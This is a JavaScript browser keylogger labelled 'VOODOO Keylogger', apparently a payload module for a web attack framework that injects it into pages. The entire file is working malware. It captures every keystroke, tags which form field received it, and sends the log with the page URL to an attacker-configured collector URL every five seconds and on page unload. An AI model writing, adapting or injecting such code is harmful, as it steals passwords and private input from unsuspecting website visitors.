/**
 * VOODOO Keylogger
 */
(function () {
    const options = REBY_INJECTED_OPTIONS;

    if (!options.collector_url) {
        return;
    }

    if (options.url_include && window.location.href.toLowerCase().indexOf(options.url_include.toLowerCase()) === -1) {
        return;
    }

    let output = "";
    let lastElement = null;

    function describe(element) {
        const names = {
            type: element.getAttribute("type"),
            name: element.getAttribute("name"),
            id: element.getAttribute("id")
        };
        let id = element.tagName + ":";
        for (let key in names) {
            if (names[key]) {
                id += `${key}=${names[key]} `
            }
        }
        return id;
    }

    function send_to_collector() {
        navigator.sendBeacon(options.collector_url, JSON.stringify({
            type: "keys",
            payload: {
                url: window.location.href,
                origin: window.location.origin,
                log: output
            }
        }));
        output = "";
    }

    setInterval(function () {
        if (output.length !== 0) {
            send_to_collector();
        }
    }, 5000);

    window.addEventListener("beforeunload", function (e) {
        if (output.length === 0) {
            return;
        }
        send_to_collector();
    }, false);

    window.addEventListener("keydown", function (event) {
        if (lastElement !== event.path[0]) {
            lastElement = event.path[0];
            output += `\n==> ${describe(event.path[0])}\n`
        }
        if (event.key.length > 1) {
            output += `[[${event.key}]]`;
        } else {
            output += event.key;
        }
    });

})();